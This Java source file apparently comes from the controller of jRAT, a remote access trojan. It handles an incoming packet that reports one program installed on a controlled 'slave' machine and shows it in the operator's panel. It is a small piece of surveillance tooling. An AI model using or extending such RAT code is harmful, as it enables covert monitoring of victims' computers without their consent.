package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelControlInstalledPrograms;

import java.io.DataInputStream;


public class Packet55InstalledProgram extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String program = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlInstalledPrograms panel = (PanelControlInstalledPrograms) frame.panels.get("installed programs");
			panel.getModel().addRow(new Object[] { program });
		}
	}

}
